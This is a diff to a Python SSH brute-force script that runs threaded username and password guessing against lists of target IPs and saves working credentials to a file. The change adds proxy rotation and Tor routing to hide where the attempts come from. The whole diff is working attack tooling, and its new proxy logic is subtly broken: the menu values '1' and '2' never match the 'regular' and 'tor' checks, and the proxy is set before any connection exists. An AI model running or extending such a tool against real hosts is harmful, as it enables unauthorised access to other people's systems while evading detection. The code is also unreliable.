@@ -22,7 +22,18 @@ def print_banner():
     )
     print(banner)
 
-def ssh_bruteforce(target_ip, username_list, password_list, use_proxies=False, proxy_list=None, num_workers=10):
+def set_proxy(client, use_proxies, proxy_type, proxy_list):
+    # Set proxy if provided and use_proxies is True
+    if use_proxies:
+        if proxy_type == "regular":
+            proxy = proxy_list.pop(0)
+            client.get_transport().set_proxy(proxy)
+            proxy_list.append(proxy)  # Append the used proxy back to the list
+        elif proxy_type == "tor":
+            # Use Tor proxy
+            client.get_transport().set_proxy(paramiko.ProxyCommand("torify nc %s %d" % ('localhost', 9050)))
+
+def ssh_bruteforce(target_ip, username_list, password_list, use_proxies=False, proxy_type="regular", proxy_list=None, num_workers=10):
     with concurrent.futures.ThreadPoolExecutor(max_workers=num_workers) as executor:
         futures = []
         for ip in target_ip:
@@ -33,24 +44,21 @@ def ssh_bruteforce(target_ip, username_list, password_list, use_proxies=False, p
                     # Submit a thread for each combination of IP, username, password, and proxy
                     futures.append(
                         executor.submit(
-                            try_ssh_connection, ip, username, password, use_proxies, proxy_list
+                            try_ssh_connection, ip, username, password, use_proxies, proxy_type, proxy_list
                         )
                     )
 
         # Wait for all threads to complete
         concurrent.futures.wait(futures)
 
-def try_ssh_connection(ip, username, password, use_proxies=False, proxy_list=None):
+def try_ssh_connection(ip, username, password, use_proxies=False, proxy_type="regular", proxy_list=None):
     try:
         # Create an SSH client
         client = paramiko.SSHClient()
         client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
         # Set proxy if provided and use_proxies is True
-        proxy = None
-        if use_proxies and proxy_list:
-            proxy = proxy_list.pop(0)
-            client.get_transport().set_proxy(proxy)
+        set_proxy(client, use_proxies, proxy_type, proxy_list)
 
         # Attempt to connect using the current credentials
         # Increase the timeout value to handle potential delays
@@ -60,9 +68,6 @@ def try_ssh_connection(ip, username, password, use_proxies=False, proxy_list=Non
         print(f"{Fore.GREEN}Successful{Style.RESET_ALL} {Fore.CYAN}login{Style.RESET_ALL} - {Fore.CYAN}IP:{Style.RESET_ALL} {ip}, {Fore.GREEN}Username:{Style.RESET_ALL} {username}, {Fore.RED}Password:{Style.RESET_ALL} {password}")
         with open("success.txt", "a") as success_file:
             success_file.write(f"IP: {ip}, Username: {username}, Password: {password}\n")
-
-        stdin, stdout, stderr = client.exec_command("uname -a")
-        print(f"{Fore.CYAN}Command Output:{Style.RESET_ALL}\n{stdout.read().decode('utf-8')}")
 
     except paramiko.AuthenticationException:
         # Incorrect credentials, continue to the next ones
@@ -74,12 +79,6 @@ def try_ssh_connection(ip, username, password, use_proxies=False, proxy_list=Non
     finally:
         # Close the SSH connection
         client.close()
-
-        # Return the used proxy to the list
-        if use_proxies and proxy_list and proxy:
-            proxy_list.append(proxy)
-            # Add a sleep interval of 5 seconds between changing proxies
-            time.sleep(5)
 
         # Add a sleep interval of 5 seconds between each password attempt
         time.sleep(5)
@@ -105,17 +104,14 @@ if __name__ == "__main__":
     with open(password_list_file, 'r') as file:
         password_list = [line.strip() for line in file.readlines()]
 
-    # Read the list of proxies from a file if using proxies
-    use_proxies = input(f"{Fore.BLUE}{Style.BRIGHT}Do you want to use proxies? (y/n): {Style.RESET_ALL}").lower() == 'y'
-    proxy_list = []
-    if use_proxies:
-        proxy_list_file = input(f"{Fore.BLUE}{Style.BRIGHT}Enter the path to the proxy list file (e.g., proxy.txt): {Style.RESET_ALL}")
+    # Prompt user to choose proxy options
+    proxy_type = input(f"{Fore.BLUE}{Style.BRIGHT}Choose proxy type (1: Regular Proxy, 2: Tor, 3: No Proxy): {Style.RESET_ALL}")
+    use_proxies = True if proxy_type in ["1", "2"] else False
+    proxy_list = None
+    if use_proxies and proxy_type in ["1", "2"]:
+        if proxy_type == "1":
+            proxy_list_file = input(f"{Fore.BLUE}{Style.BRIGHT}Enter the path to the proxy list file: {Style.RESET_ALL}")
+            with open(proxy_list_file, 'r') as file:
+                proxy_list = [line.strip() for line in file.readlines()]
 
-        with open(proxy_list_file, 'r') as file:
-            proxy_list = [line.strip() for line in file.readlines()]
-
-    # Get user input for the number of workers
-    num_workers = int(input(f"{Fore.BLUE}{Style.BRIGHT}Enter the number of workers to use (e.g., 10): {Style.RESET_ALL}"))
-
-    # Run SSH bruteforce on the generated IP addresses
-    ssh_bruteforce(target_ip_list, username_list, password_list, use_proxies, proxy_list, num_workers)
+    ssh_bruteforce(target_ip_list, username_list, password_list, use_proxies, proxy_type, proxy_list)
